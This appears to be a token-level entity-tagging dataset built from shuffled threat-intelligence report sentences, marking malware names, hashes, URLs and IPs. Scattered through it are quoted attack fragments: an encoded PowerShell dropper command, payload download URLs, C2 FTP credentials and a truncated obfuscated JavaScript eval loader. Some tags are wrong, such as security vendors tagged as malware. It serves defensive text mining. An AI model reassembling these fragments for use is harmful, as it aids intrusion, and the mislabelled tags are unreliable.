–	O
ScanBox	B-malware.infosteal
Sites	O

The	O
function	O
which	O
creates	O
stubs	O
to	O
inject	O
PNF	O
DLL	O
into	O
processes	O
:	O
The	O
mrxcls	O
version	O
uses	O
a	O
stub	O
with	O
a	O
total	O
size	O
of	O
6332	O
bytes	O
.	O

Backdoors	O
The	O
malware	O
server	O
also	O
hosts	O
fi	O
ve	O
payloads	O
that	O
act	O
as	O
backdoors	O
on	O
the	O
targeted	O
systems	O
.	O

DAT	O
files	O
VSE	O
BOP	O
Host	O
IPS	O
Coverage	O
is	O
provided	O
as	O
Roarur.dr	O
in	O
the	O
5862	O
DATS	O
,	O
released	O
January	O
15	O
.	O

In	O
particular	O
,	O
a	O
tweet	O
from	O
Brandon	O
Dixon	O
with	O
relevant	O
data	O
from	O
the	O
PassiveTotal	O
project	O
details	O
several	O
subdomains	O
and	O
IP	O
addresses	O
associated	O
with	O
java-se.com	O
.	O

Commands	O
were	O
sent	O
by	O
the	O
C2	O
and	O
processed	O
by	O
the	O
backdoor	O
in	O
the	O
form	O
of	O
encoded	O
DWORDs	O
,	O
each	O
correspondeding	O
to	O
a	O
particular	O
action	O
listed	O
above	O
.	O

In	O
this	O
way	O
,	O
removed	O
most	O
of	O
the	O
functions	O
from	O
our	O
analysis	O
scope	O
.	O

This	O
became	O
a	O
key	O
signature	O
of	O
the	O
hackers	O
;	O
a	O
common	O
thread	O
which	O
unraveled	O
all	O
of	O
Sofacy	B-malware.backdoor
's	O
careful	O
preparation	O
.	O

It	O
contains	O
a	O
resource	O
named	O
'	O
important	O
.	O
'	O

The	O
back	O
door	O
program	O
used	O
in	O
the	O
APT-C-06	O
organization	O
's	O
early	O
APT	O
operation	O
was	O
Lucker	B-malware.backdoor
.	O

These	O
documents	O
were	O
also	O
emailed	O
to	O
organizations	O
in	O
Japan	O
and	O
Taiwan	O
.	O

Write	O
infection	O
ID	O
to	O
the	O
registry	O
and	O
immediately	O
terminate	O
the	O
server	O
variant	O
.	O

All	O
of	O
them	O
appear	O
to	O
be	O
native	O
Korean	O
speakers	O
,	O
or	O
at	O
least	O
have	O
Korean	O
language	O
proficiency	O
that	O
is	O
at	O
the	O
near-native	O
level	O
.	O

Diving	O
further	O
into	O
some	O
of	O
the	O
replies	O
to	O
this	O
tweet	O
is	O
a	O
plethora	O
of	O
information	O
regarding	O
the	O
exploit	O
domain	O
java-se.com	B-url.normal
.	O

f9acc706d7bec10f88f9cfbbdf80df0d85331bd4c3c0188e4d002d6929fe4eac	B-hash
e28294f62178451c7b11988d2c790f7f44c81b0bf06ab252e60f6b9ca57cacec	B-hash
36db2c5f8bb947cad25a4abeaff1ff0e827bd7fcf9c77dbfb36247e3fc9f530a	B-hash
4de5a22cd798950a69318fdcc1ec59e9a456b4e572c2d3ac4788ee96a4070262	B-hash
7188f76ca5fbc6e57d23ba97655b293d5356933e2ab5261e423b3f205fe305ee	B-hash
388d6b38f21c79e0e2ad7ead1108025b8bb3486d8d29f2468b5cb0e54bff11d2	B-hash
37333ecdd16b1ecbcd070b202492c1870dafd799f6299a420cdcc8a9e149cc93	B-hash

/2017/10/taiwan-heist-lazarus-tools.html	B-url.normal

This	O
attack	O
has	O
been	O
claimed	O
to	O
setback	O
Iran	O
's	O
nuclear	O
program	O
by	O
several	O
years	O
as	O
1,000	O
out	O
of	O
9,000	O
centrifuges	O
were	O
disabled	O
and	O
had	O
to	O
be	O
replaced.The	O
initial	O
attack	O
point	O
is	O
likely	O
to	O
be	O
via	O
a	O
USB	O
infection	O
.	O

echo	O
powershell	O
-Enc	O
KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUw	O
...	O
chcp	O
65001	O
cd	O
'	O
%	O
tmp	O
%	O
'	O
start	O
winword	O
'	O
article_draft.docx	O
'	O
copy	O
'	O
article_draft.docx	O
'	O
'	O
%	O
1	O
'	O
del	O
/f	O
'	O
%	O
1\*.*.lnk	O
'	O
echo	O
powershell	O
-Enc	O
KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMA	O
...	O
'	O
%	O
tmp%\dwm.exe	O
'	O

After	O
the	O
second	O
stage	O
of	O
VBS	O
is	O
decoded	O
(	O
Figure	O
5	O
and	O
Figure	O
6	O
)	O
,	O
the	O
script	O
downloads	O
the	O
final	O
stage	O
from	O
hxxp://<redacted>/28022018/pz.zip	O
.	O

As	O
the	O
investigation	O
progressed	O
,	O
some	O
of	O
the	O
IOCs	O
observed	O
in	O
Operation	O
Cobalt	O
Kitty	O
started	O
to	O
emerge	O
in	O
the	O
wild	O
,	O
and	O
recently	O
some	O
were	O
even	O
reported	O
being	O
used	O
in	O
other	O
campaigns	O
.	O

They	O
appear	O
not	O
to	O
have	O
highly	O
technical	O
skills	O
but	O
a	O
good	O
social	O
engineering	O
and	O
phishing	O
tricks	O
.	O

Distribution	O
of	O
Russian/Ukrainian	O
Language	O
Use	O
in	O
Ukraine	O
forces	O
operating	O
in	O
eastern	O
Ukraine	O
.	O

This	O
for	O
once	O
is	O
a	O
resilience	O
measure	O
,	O
so	O
if	O
the	O
initially	O
infected	O
process	O
stops	O
running	O
the	O
malware	O
remains	O
in	O
memory	O
through	O
additional	O
instances	O
.	O

Components	O
of	O
TG-4127	O
operations	O
have	O
been	O
reported	O
under	O
the	O
names	O
APT28	B-malware.infosteal
,	O
Sofacy	B-malware.infosteal
,	O
Sednit	B-malware.infosteal
,	O
and	O
Pawn	B-malware.infosteal
Storm	I-malware.infosteal
.	O

Mazagon	O
Dock	O
Shipbuilders	O
Limited	O
(	O
MDL	O
)	O
is	O
listed	O
as	O
one	O
of	O
clients	O
of	O
Hidrofersa	O
(	O
mentioned	O
in	O
Hidrofersa	O
website	O
)	O
and	O
as	O
per	O
their	O
website	O
Hidrofersa	O
has	O
shipped	O
equipments	O
to	O
Mazagon	O
Dock	O
Shipbuilders	O
Limited	O
(	O
MDL	O
)	O
in	O
the	O
past	O
as	O
shown	O
in	O
the	O
below	O
screen	O
shots	O
.	O

The	O
attackers	O
must	O
use	O
a	O
second	O
stage	O
download	O
mechanism	O
to	O
achieve	O
full	O
system	O
access	O
due	O
to	O
memory	O
constraints	O
.	O

Another	O
possible	O
name	O
is	O
:	O

In	O
a	O
real	O
attack	O
scenario	O
,	O
the	O
injected	O
process	O
identifier	O
is	O
obviously	O
unknown	O
to	O
the	O
attacker	O
and	O
a	O
suitable	O
host	O
process	O
should	O
be	O
located	O
at	O
runtime	O
.	O

This	O
profile	O
has	O
been	O
made	O
private	O
following	O
our	O
publication	O
.	O

ID	O
:	O
ftp	O
Domains	O
:	O
ftp.skydnastwm.com:15836	B-url.unknown
|	I-url.unknown
Password	O
:	O
Ecp982*	O
@	O
Me2	O
Mutex	O
:	O
fftp	O

Furthermore	O
,	O
APT32	B-malware.infosteal
continues	O
to	O
threaten	O
political	O
activism	O
and	O
free	O
speech	O
in	O
Southeast	O
Asia	O
and	O
the	O
public	O
sector	O
worldwide	O
.	O

Are	O
the	O
backups	O
stored	O
offline	O
?	O

do	O
not	O
hesitate	O
to	O
contact	O
me	O
if	O
need	O
be	O
.	O

The	O
convenient	O
thing	O
about	O
this	O
is	O
that	O
the	O
CNC	O
panel	O
worked	O
with	O
any	O
version	O
,	O
3.10	O
and	O
above	O
.	O

*	O
[	O
ROOT_DRIVE	O
]	O
:	O
\Users\Administrator\AppData\Local\Allians\mcp\unk\*	O
.	O

We	O
discovered	O
the	O
following	O
SHA1s	O
in	O
relation	O
to	O
DUBNIUM	B-malware.drop
:	O
35847c56e3068a98cff85088005ba1a611b6261f	B-hash
09b022ef88b825041b67da9c9a2588e962817f6d	B-hash
7f9ecfc95462b5e01e233b64dcedbcf944e97fca	B-hash
cad21e4ae48f2f1ba91faa9f875816f83737bcaf	B-hash
ebccb1e12c88d838db15957366cee93c079b5a8e	B-hash
aee8d6f39e4286506cee0c849ede01d6f42110cc	B-hash
b42ca359fe942456de14283fd2e199113c8789e6	B-hash
0ac65c60ad6f23b2b2f208e5ab8be0372371e4b3	B-hash
1949a9753df57eec586aeb6b4763f92c0ca6a895	B-hash
259f0d98e96602223d7694852137d6312af78967	B-hash
4627cff4cd90dc47df5c4d53480101bdc1d46720	B-hash
561db51eba971ab4afe0a811361e7a678b8f8129	B-hash
6e74da35695e7838456f3f719d6eb283d4198735	B-hash
8ff7f64356f7577623bf424f601c7fa0f720e5fb	B-hash
a3bcaecf62d9bc92e48b703750b78816bc38dbe8	B-hash
c9cd559ed73a0b066b48090243436103eb52cc45	B-hash
dc3ab3f6af87405d889b6af2557c835d7b7ed588	B-hash
df793d097017b90bc9d7da9a85f929422004f6b6	B-hash
8ff7f64356f7577623bf424f601c7fa0f720e5fb	B-hash
6ccba071425ba9ed69d5a79bb53ad27541577cb9	B-hash

The	O
other	O
two	O
samples	O
(	O
9527.exe	B-malware.unknown
and	O
8555++.exe	B-malware.unknown
)	O
communicate	O
with	O
other	O
two	O
servers	O
that	O
are	O
part	O
of	O
the	O
infrastructure	O
dll.pzchao.com	B-url.unknown
;	O
455.pzchao.com	B-url.unknown
.	O

stopTakeScreenShot	O

Campaign	O
ID	O
:	O
2018-1-29-No.1	O

Windows	O
Search	O
(	O
vulnerable	O
applications	O
:	O
searchindexer.exe	O
/searchprotoclhost.exe	O
)	O

Further	O
layers	O
of	O
obfuscation	O
emerged	O
when	O
Blue	O
Coat	O
was	O
able	O
to	O
determine	O
that	O
the	O
attackers	O
were	O
communicating	O
with	O
CloudMe.com	O
through	O
a	O
hacked	O
network	O
of	O
compromised	O
routers	O
,	O
the	O
majority	O
of	O
which	O
were	O
located	O
in	O
South	O
Korea	O
.	O

XAP	O
is	O
a	O
software	O
package	O
format	O
used	O
for	O
Microsoft	O
Silverlight	O
applications	O
.	O

Unbelievably	O
,	O
DarkComet	B-malware.backdoor
bot	O
is	O
accidentally	O
encrypting	O
the	O
(	O
buggy	O
)	O
GET	O
request	O
string	O
at	O
instruction	O
0x00493972	O
via	O
a	O
call	O
to	O
the	O
already-reversed	O
Encrypt_sub_44C34C	O
(	O
)	O
routine	O
.	O

This	O
implant	O
has	O
been	O
connected	O
to	O
a	O
major	O
Korean	O
bank	O
attack	O
and	O
is	O
also	O
known	O
as	O
Trojan	O
Manuscript	O
.	O

0d3a33cb848499a9404d099f8238a6a0e0a4b471	B-hash
c219a1ac5b4fd6d20a61bb5fdf68f65bbd40b453	B-hash
91e9465532ef967c93b1ef04b7a906aa533a370e	B-hash

'	O
Meltdown	O
'	O
and	O
'	O
Spectre	O
'	O
are	O
major	O
vulnerabilities	O
affecting	O
almost	O
every	O
computer	O
in	O
the	O
world	O
.	O

Test	O
Commands	O
Two	O
-­‐	O
Retrieve	O
Directory	O
Listing	O
From	O
Any	O
Connected	O
Drive	O
and	O
Attempt	O
Data	O
Collection	O
Retrieval	O
Command	O

These	O
implants	O
are	O
variations	O
of	O
earlier	O
forms	O
of	O
Bankshot	O
,	O
a	O
remote	O
access	O
tool	O
that	O
gives	O
an	O
attacker	O
full	O
capability	O
on	O
a	O
victim	O
's	O
system	O
.	O

existence	O
of	O
the	O
Fiddler	O
web	O
debugger	O
,	O
which	O
is	O
very	O
popular	O
among	O
malware	O
analysts	O
.	O

It	O
's	O
not	O
easy	O
to	O
get	O
a	O
clue	O
of	O
what	O
this	O
binary	O
is	O
doing	O
internally	O
by	O
just	O
skimming	O
through	O
a	O
memory	O
snapshot	O
.	O

ZxShell	B-malware.backdoor
has	O
been	O
observed	O
to	O
be	O
distributed	O
through	O
phishing	O
attacks	O
,	O
dropped	O
by	O
exploits	O
that	O
leverage	O
vulnerabilities	O
such	O
as	O
CVE-2011-2462	O
,	O
CVE-2013-3163	O
,	O
and	O
CVE-2014-0322	O
.	O

Libyan	B-malware.infosteal
Scorpions	I-malware.infosteal
is	O
believed	O
to	O
be	O
a	O
political	O
motivated	O
group	O
targeting	O
a	O
high-level	O
influential	O
and	O
political	O
figures	O
in	O
multiple	O
cities	O
within	O
Libya	O
.	O

Trend	O
Micro	O
.	O

InfoOS	O
:	O
Gather	O
information	O
from	O
the	O
infected	O
computer	O
,	O
such	O
as	O
:	O
IOPlatformUUID	O
,	O
process	O
list	O
,	O
operating	O
system	O
version	O
.	O

In	O
cases	O
where	O
the	O
attackers	O
have	O
included	O
software	O
checks	O
within	O
their	O
ScanBox	B-malware.infosteal
code	O
,	O
it	O
tends	O
to	O
be	O
for	O
the	O
same	O
original	O
list	O
of	O
filenames	O
(	O
Appendix	B-malware.unknown
C	O
)	O
.	O

In	O
at	O
least	O
one	O
case	O
,	O
a	O
decoy	O
document	O
included	O
in	O
the	O
attack	O
contained	O
content	O
that	O
focused	O
on	O
Pakistan	O
military	O
advancements	O
in	O
unmanned	O
vehicle	O
,	O
or	O
'	O
drone	O
'	O
technology	O
.	O

The	O
malware	O
is	O
able	O
to	O
monitor	O
the	O
physical	O
location	O
of	O
the	O
compromised	O
Android	O
device	O
.	O

Inside	O
each	O
directory	O
we	O
could	O
find	O
statistics	O
with	O
the	O
number	O
of	O
victims	O
reporting	O
to	O
the	O
C2	O
.	O

Finally	O
,	O
we	O
summarize	O
our	O
 ndings	O
.	O

....	O
,	O
....	O
a..	O
|	O
00000010	O
19	O
26	O
f8	O
de	O
bd	O
26	O
de	O
19	O
b0	O
19	O
1a	O
95	O
a1	O
dd	O
2b	O
6d	O
|	O
.	O
&	O
...	O
&	O
........	O
+m	O
|	O
00000020	O
c2	O
1a	O
82	O
b0	O
19	O
eb	O
47	O
b0	O
26	O
47	O
b0	O
26	O
20	O
82	O
eb	O
ca	O
|	O
......	O
G.&G.	O
&	O
...	O
|	O
00000030	O
bd	O
26	O
ca	O
82	O
54	O
1a	O
d0	O
c2	O
87	O
38	O
a1	O
20	O
82	O
b0	O
19	O
eb	O
|	O
.	O
&	O
..T	O
....	O
8	O
.....	O
|	O
00000040	O
b0	O
54	O
b0	O
19	O
1a	O
00	O
|	O
.T	O
....	O
|	O
At	O
the	O
time	O
of	O
the	O
analysis	O
all	O
the	O
C	O
&	O
C	O
servers	O
were	O
not	O
responding	O
,	O
we	O
started	O
reverse	O
engineering	O
the	O
communication	O
protocol	O
and	O
noticed	O
that	O
it	O
simply	O
used	O
a	O
multiply	O
with	O
0x69	O
to	O
encode	O
the	O
traffic	O
sent	O
to	O
the	O
controllers	O
.	O

This	O
way	O
,	O
the	O
attackers	O
set	O
a	O
pre-shared	O
authentication	O
value	O
.	O

On	O
26th	O
January	O
,	O
2017	O
Indian	O
Navy	O
displayed	O
its	O
state-of-the-art	O
stealth	O
guided	O
missile	O
destroyer	O
INS	O
Chennai	O
and	O
the	O
indigenously-made	O
Kalvari	O
class	O
Scorpene	O
submarines	O
at	O
the	O
Republic	O
Day	O
parade	O
showcasing	O
India	O
's	O
military	O
strength	O
and	O
achievements	O
.	O

JAVASCRIPT	O
ARTIFACTS	O

The	O
obfuscated	O
string	O
is	O
:	O

If	O
one	O
were	O
to	O
click	O
Run	O
from	O
this	O
prompt	O
,	O
it	O
would	O
result	O
in	O
the	O
file	O
css.jpg	O
being	O
download	O
over	O
an	O
encrypted	O
channel	O
from	O
a	O
folder	O
on	O

What	O
happens	O
after	O
a	O
target	O
machine	O
is	O
infected	O
?	O

In	O
January	O
2016	O
we	O
've	O
published	O
an	O
extensive	O
report	O
about	O
the	O
campaign	O
and	O
malware	O
-	O
'	O
Operation	O
DustySky	B-malware.drop
'	O
-	O
which	O
is	O
available	O
here	O
:	O
clearskysec.com/dustysky	B-malware.drop

Exploit	O
:	O

According	O
to	O
our	O
LiveGrid®	O
telemetry	O
,	O
the	O
malware	O
was	O
created	O
right	O
after	O
execution	O
of	O
the	O
M.E.Doc	O
software	O
that	O
is	O
widely	O
used	O
by	O
accounting	O
personnel	O
in	O
Ukraine	O
.	O

www.ndbssh[.]com	B-url.unknown
.	O

Of	O
these	O
,	O
there	O
were	O
direct	O
overlaps	O
for	O
two	O
of	O
the	O
Operational	B-malware.ransom
Manul	I-malware.ransom
domains	O
.	O

Found	O
in	O
Israel	O
Word	O
document	O
,	O
contained	O
in	O
SFX	O
RAR	O
file	O
9D144A828F757A90B86976EF0C906B3F	B-hash
Word	O
document	O
,	O
contained	O
in	O
SFX	O
RAR	O
file	O
D14E0A3D408065B1551F2827B50B83CA	B-hash
Word	O
document	O
,	O
contained	O
in	O
SFX	O
RAR	O
file	O
C8202523F35295E8BC8CC1731EDB0559	B-hash
Word	O
document	O
,	O
contained	O
in	O
SFX	O
RAR	O
file	O
C21D7165B25CAF65D7F92FF758C1B5B1	B-hash

T	O
his	O
Metasploit	O
's	O
encoder	O
obfuscates	O
the	O
last	O
part	O
of	O
the	O
launcher	O
's	O
code	O
,	O
which	O
in	O
turn	O
resolves	O
the	O
necessary	O
API	O
and	O
maps	O
thumb.db	O
into	O
the	O
same	O
process	O
's	O
(	O
pcAnywhere	O
)	O
memory	O
.	O

We	O
have	O
observed	O
two	O
initial	O
conversations	O
with	O
the	O
C	O
&	O
C	O
server	O
(	O
all	O
are	O
done	O
via	O
HTTP	O
GET	O
or	O
POST	O
to	O
the	O
server	O
)	O
:	O
HTTP	O
POST	O
to	O
{	O
script	O
}	O
.jsp	O
?	O
action=	O
BaseInfo	O
&	O
u=XXX	O
:	O
Sends	O
the	O
victim	O
information	O
to	O
the	O
backend	O
server	O
HTTP	O
GET	O
to	O
{	O
script	O
}	O
.jsp	O
?	O
action=	O
What	O
&	O
u=XXX	O
:	O
Checks	O
if	O
there	O
are	O
any	O
pending	O
jobs	O
for	O
the	O
backdoor	O
This	O
means	O
that	O
the	O
backdoor	O
is	O
responsible	O
for	O
both	O
uploading	O
victim	O
information	O
,	O
as	O
well	O
as	O
executing	O
any	O
tasks	O
that	O
the	O
controller	O
has	O
assigned	O
to	O
it	O
,	O
which	O
includes	O
the	O
following	O
:	O

The	O
file	O
is	O
then	O
attached	O
to	O
an	O
e-mail	O
and	O
sent	O
to	O
the	O
master	O
's	O
e-mail	O
account	O
.	O

tamindir[.]com	B-url.normal
to	O
truecrypt[.]com	B-url.normal
poisoned	O
TrueCrypt	O
installer	O
redirects	O

The	O
spyware	O
was	O
spread	O
using	O
at	O
least	O
the	O
following	O
three	O
fake	O
Facebook	O
profiles	O
.	O

Version	O
Information	O

This	O
indicates	O
some	O
degree	O
of	O
prior	O
penetration	O
of	O
the	O
opposition—	O
either	O
through	O
computer	O
network	O
intrusion	O
or	O
other	O
intelligence	O
gathering	O
activities	O
.	O

CWS	O
or	O
WSA	O
web	O
scanning	O
prevents	O
access	O
to	O
malicious	O
websites	O
,	O
including	O
watering	O
hole	O
attacks	O
,	O
and	O
detects	O
malware	O
used	O
in	O
these	O
attacks	O
.	O

We	O
do	O
not	O
know	O
for	O
sure	O
how	O
this	O
criticism	O
affected	O
other	O
South	O
Korean	O
organizations	O
,	O
but	O
we	O
do	O
know	O
that	O
many	O
South	O
Korean	O
organizations	O
install	O
AhnLab	O
security	O
products	O
.	O

The	O
attack	O
chain	O
occurs	O
in	O
multiple	O
stages	O
with	O
the	O
PostScript	O
deobfuscating	O
a	O
first	O
stage	O
shellcode	O
that	O
's	O
been	O
XORed	O
with	O
a	O
hardcoded	O
four-byte	O
key	O
.	O

Well	O
known	O
for	O
their	O
ability	O
to	O
infiltrate	O
and	O
remain	O
undiscovered	O
in	O
networks	O
for	O
long	O
periods	O
of	O
time	O
,	O
they	O
may	O
be	O
the	O
most	O
successful	O
group	O
of	O
hackers	O
in	O
the	O
world	O
.	O

Of	O
course	O
,	O
that	O
recursively	O
list	O
files	O
.	O

hxxp://alertmymail[.]com/lotopoto07/plugins/wsutils.exe	B-url.unknown

The	O
attacker	O
can	O
send	O
additional	O
executables	O
in	O
this	O
way	O
.	O

In	O
addition	O
,	O
it	O
is	O
recommended	O
that	O
networks	O
begin	O
blocking	O
the	O
following	O
hashes	O
and	O
communications	O
with	O
the	O
identified	O
Command	O
and	O
Control	O
(	O
C2	O
)	O
server	O
:	O
Malware	O
SHA1	O
Hash	O
0450aaf8ed309ca6baf303837701b5b23aac6f05	O
bb909d9c27a509bf97cdc85268556ff5a6d2550a	O
f325970fd24bb088f1befdae5788152329e26bf3	O
a351842ee01374d66bae35354ffe72f0b1b8a40b	O
Command	O
and	O
Control	O
(	O
C2	O
)	O
Server	O
:	O
176.31.112.10	O
methods	O
of	O
cover	O
for	O
their	O
activity	O
.	O

%	O
windir%system32kbdlv2.dll	O
%	O
windir%system32auto.dll	O
%	O
windir%system32netsvcs.exe	O
%	O
windir%system32netsvcs_ko.dll	O
%	O
windir%system32vcmon.exe	O
%	O
windir%system32svcsmon.exe	O
%	O
windir%system32svcsmon_ko.dll	O
%	O
windir%system32wsmss.exe	O
%	O
temp%~DFE8B437DD7C417A6D.TMP	O
%	O
temp%~DFE8B43.TMP	O
%	O
temp%~tmp.dll	O
C:Windowstaskmgr.exe	O
C:Windowssetup.log	O
C:Windowswinlog.txt	O
C:Windowsupdate.log	O
C:Windowswmdns.log	O
C:Windowsoledvbs.inc	O
C:Windowsweoig.log	O
C:Windowsdata.dat	O
C:Windowssys.log	O
C:WindowsPcMon.exe	O
C	O
:	O
WindowsGoogle	O
Update.exe	O
C:WindowsReadMe.log	O
C:Windowsmsdatt.bat	O
C:Windowsmsdatl3.inc	O
C	O
:	O
Program	O
FilesCommon	O
FilesSystemOle	O
DBmsdmeng.cnt	O
C	O
:	O
Program	O
FilesCommon	O
FilesSystemOle	O
DBxmlrwbin.inc	O
C	O
:	O
Program	O
FilesCommon	O
FilesSystemOle	O
DBmsdapml.cnt	O
C	O
:	O
Program	O
FilesCommon	O
FilesSystemOle	O
DBsqlsoldb.exe	O
C	O
:	O
Program	O
FilesCommon	O
FilesSystemOle	O
DBoledjvs.inc	O
C	O
:	O
Program	O
FilesCommon	O
FilesSystemOle	O
DBoledvbs.inc	O
C	O
:	O
Program	O
FilesCommon	O
FilesSystemOle	O
DBmsolui80.inc	O
C	O
:	O
Program	O
FilesCommon	O
FilesSystemOle	O
DBmsdaipp.cnt	O
C	O
:	O
Program	O
FilesCommon	O
FilesSystemOle	O
DBmsdaerr.cnt	O
C	O
:	O
Program	O
FilesCommon	O
FilesSystemOle	O
DBsqlxmlx.inc	O
<	O
Hangul	O
full	O
path	O
>	O
HncReporter.exe	O

Normally	O
,	O
the	O
group	O
goes	O
underground	O
for	O
a	O
few	O
months	O
,	O
redesigns	O
the	O
tools	O
and	O
the	O
malware	O
and	O
resume	O
operations	O
.	O

The	O
related	O
script	O
can	O
be	O
loaded	O
via	O
the	O
guiding	O
PE	O
program	O
or	O
vulnerability	O
.	O

•	O
A	O
flexible	O
,	O
modular	O
framework	O
that	O
has	O
allowed	O
APT28	B-malware.infosteal
to	O
consistently	O
evolve	O
its	O
toolset	O
since	O
at	O
least	O
2007	O
.	O

This	O
method	O
enables	O
the	O
RAT	O
library	O
to	O
run	O
on	O
the	O
host	O
machine	O
without	O
a	O
dedicated	O
process	O
and	O
without	O
registration	O
of	O
the	O
library	O
under	O
the	O
loaded	O
modules	O
.	O

The	O
request	O
is	O
encoded	O
in	O
a	O
custom	O
BASE64	O
encoding	O
,	O
using	O
the	O
following	O
alphabet	O
:	O

On	O
January	O
14	O
Microsoft	O
publicly	O
disclosed	O
this	O
vulnerability	O
.	O

In	O
journey-in-israel[.]com	B-url.unknown
,	O
the	O
attackers	O
inserted	O
an	O
exploit	O
code	O
for	O
CVE-2014-6332	B-malware.unknown
–	O
a	O
Windows	O
code	O
execution	O
vulnerability	O
.	O

If	O
such	O
environments	O
are	O
detected	O
,	O
the	O
dropper	O
will	O
not	O
deploy	O
the	O
.NET	O
executable	O
(	O
scada.exe	B-malware.unknown
)	O
to	O
the	O
host	O
.	O

정해진	O
시스템에서만	O
관리	O
서버	O
접근이	O
가능하도록	O
제한하는	O
것은	O
물론	O
,	O
관리	O
서버의	O
로그인	O
정보	O
(	O
관리자	O
계정	O
)	O
를	O
자주	O
변경하고	O
시스템에	O
저장하	O
지	O
않는	O
등의	O
기본적인	O
보안	O
정책이	O
지켜질	O
수	O
있도록	O
적절한	O
관리가	O
필요하다	O
.	O

The	O
batch	O
script	O
pings	O
a	O
hard	O
coded	O
IP	O
address	O
180[.]92[.]154[.]176	B-ip.unknown
10	O
times	O
(	O
this	O
is	O
a	O
technique	O
used	O
to	O
sleep	O
for	O
10	O
seconds	O
)	O
before	O
deleting	O
all	O
the	O
files	O
.	O

This	O
function	O
is	O
the	O
supporting	O
functionality	O
for	O
WinVNC	O
.	O

This	O
is	O
a	O
fairly	O
popular	O
webshell	O
that	O
Volexity	B-malware.backdoor
has	O
encountered	O
on	O
several	O
occasions	O
when	O
dealing	O
with	O
website	O
compromises	O
.	O

That	O
's	O
why	O
we	O
updated	O
this	O
document	O
to	O
include	O
a	O
graph	O
of	O
the	O
loader	O
:	O
Decryption	O
of	O
module	O
and	O
function	O
names	O

While	O
IRONGATE	B-malware.backdoor
malware	O
does	O
not	O
compare	O
to	O
Stuxnet	O
in	O
terms	O
of	O
complexity	O
,	O
ability	O
to	O
propagate	O
,	O
or	O
geopolitical	O
implications	O
,	O
IRONGATE	B-malware.backdoor
leverages	O
some	O
of	O
the	O
same	O
features	O
and	O
techniques	O
Stuxtnet	O
used	O
to	O
attack	O
centrifuge	O
rotor	O
speeds	O
at	O
the	O
Natanz	O
uranium	O
enrichment	O
facility	O
;	O
it	O
also	O
demonstrates	O
new	O
features	O
for	O
ICS	O
malware	O
.	O

Over	O
the	O
past	O
few	O
months	O
,	O
a	O
number	O
of	O
decoy	O
documents	O
have	O
been	O
used	O
.	O

There	O
was	O
no	O
open-source	O
footprint	O
for	O
the	O
remaining	O
42	O
addresses	O
,	O
suggesting	O
that	O
TG-4127	B-malware.infosteal
acquired	O
them	O
from	O
another	O
source	O
,	O
possibly	O
other	O
intelligence	O
activity	O
.	O

What	O
are	O
the	O
malicious	O
tools	O
used	O
by	O
the	O
Poseidon	B-malware.infosteal
Group	O
?	O

In	O
any	O
case	O
,	O
be	O
it	O
Windows	O
7	O
or	O
not	O
,	O
this	O
malicious	O
code	O
decrypts	O
its	O
spying	O
library	O
from	O
resources	O
,	O
saves	O
it	O
to	O
disk	O
with	O
an	O
apparently	O
random	O
but	O
hardcoded	O
name	O
,	O
for	O
example	O
,	O
~DFE8B437DD7C417A6D.TMP	O
,	O
in	O
the	O
user	O
's	O
temporary	O
folder	O
and	O
loads	O
this	O
file	O
as	O
library	O
.	O

Cobalt	O
Strike	O
usage	O
in	O
APT	O
-	O
Cobalt	O
Strike	O
is	O
a	O
commercial	O
offensive	O
security	O
framework	O
designed	O
to	O
simulate	O
complex	O
attacks	O
and	O
is	O
mainly	O
used	O
by	O
security	O
professionals	O
in	O
security	O
audits	O
and	O
penetration	O
testing	O
.	O

in	O
the	O
2000s	O
,	O
relatively	O
close	O
to	O
the	O
current	O
year	O
)	O
.	O

2014-03-15	O
2014-03-02	O
2014-02-22	O
2014-02-18	O
2014-02-15	O
2014-02-12	O
2014-02-02	O
2014-01-30	O
2014-01-27	O
2014-01-25	O
2014-01-20	O
2014-01-15	O
169.254.163.19	B-ip.unknown
113.65.22.148	B-ip.unknown
169.254.61.191	B-ip.unknown
113.68.111.111	B-ip.unknown
113.68.108.62	B-ip.unknown
113.68.168.73	B-ip.unknown
169.254.92.25	B-ip.unknown
113.65.43.42	B-ip.unknown
113.66.12.112	B-ip.unknown
113.65.41.28	B-ip.unknown
113.68.171.67	B-ip.unknown
113.68.110.239	B-ip.unknown
LINK	O
LOCAL	O
CHINANET	O
GUANGDONG	O
PROVINCE	O
NETWORK	O
LINK	O
LOCAL	O
CHINANET	O
GUANGDONG	O
PROVINCE	O
NETWORK	O
CHINANET	O
GUANGDONG	O
PROVINCE	O
NETWORK	O
CHINANET	O
GUANGDONG	O
PROVINCE	O
NETWORK	O
LINK	O
LOCAL	O
CHINANET	O
GUANGDONG	O
PROVINCE	O
NETWORK	O
CHINANET	O
GUANGDONG	O
PROVINCE	O
NETWORK	O
CHINANET	O
GUANGDONG	O
PROVINCE	O
NETWORK	O
CHINANET	O
GUANGDONG	O
PROVINCE	O
NETWORK	O
CHINANET	O
GUANGDONG	O
PROVINCE	O
NETWORK	O

It	O
is	O
not	O
intended	O
and	O
should	O
not	O
be	O
construed	O
to	O
constitute	O
legal	O
advice	O
.	O

Even	O
today	O
,	O
the	O
balance	O
between	O
ideology	O
and	O
cyber	O
skills	O
remains	O
problematic	O
.	O

735	O
,	O
427	O
,	O
336	O
,	O
413	O
,	O
735	O
,	O
420	O
,	O
350	O
,	O
336	O
,	O
336	O
,	O
413	O
,	O
735	O
,	O
301	O
,	O
301	O
,	O
287	O
,	O
224	O
,	O
861	O
,	O
840	O
,	O
637	O
,	O
735	O
,	O
651	O
,	O
427	O
,	O
770	O
,	O
301	O
,	O
805	O
,	O
693	O
,	O
413	O
,	O
875	O
)	O
;	O
var	O
arr	O
=	O
new	O
Array	O
;	O
for	O
(	O
var	O
i	O
=	O
0	O
;	O
i	O
<	O
sss.length	O
;	O
i	O
++	O
)	O
{	O
arr	O
[	O
i	O
]	O
=	O
String.fromCharCode	O
(	O
sss	O
[	O
i	O
]	O
/	O
7	O
)	O
;	O
var	O
cc	O
=	O
arr.toString	O
(	O
)	O
;	O
cc	O
=	O
cc.replace	O
(	O
/	O
,	O
/g	O
,	O
'	O
'	O
)	O
;	O
cc	O
=	O
cc.replace	O
(	O
/	O
@	O
/g	O
,	O
'	O
,	O
'	O
)	O
;	O
eval	O
(	O
cc	O
)	O
;	O
var	O
x1	O
=	O
new	O
Array	O
(	O
)	O
;	O
for	O
(	O
i	O
=	O
0	O
;	O
i	O
<	O
200	O
;	O
i	O
++	O
)	O
{	O
x1	O
[	O
i	O
]	O
=	O
document.createElement	O
(	O
'	O
